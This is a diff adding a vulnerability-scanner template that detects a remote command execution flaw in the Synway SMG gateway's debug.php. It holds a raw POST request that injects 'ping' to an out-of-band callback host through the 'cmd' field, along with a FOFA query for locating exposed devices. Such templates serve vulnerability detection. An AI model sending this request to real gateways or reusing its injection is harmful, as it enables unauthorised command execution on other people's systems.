@@ -1,0 +1,40 @@
+id: sanhui-smg-debug-rce
+
+info:
+  name: Synway SMG Gateway debug.php - Remote Code Execution
+  author: qwtd
+  severity: critical
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%89%E6%B1%87%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/%E4%B8%89%E6%B1%87%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6debug.php%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="text ml10 mr20" && title="网关管理软件"
+  tags: 三汇SMG-网关管理软件
+
+http:
+  - raw:
+      - |
+        POST /debug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="comdtype"
+
+        1
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="cmd"
+
+        ping {{interactsh-url}}
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb
+        Content-Disposition: form-data; name="run"
+
+        ------WebKitFormBoundaryAEiWTHP0DxJ7Uwmb--
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
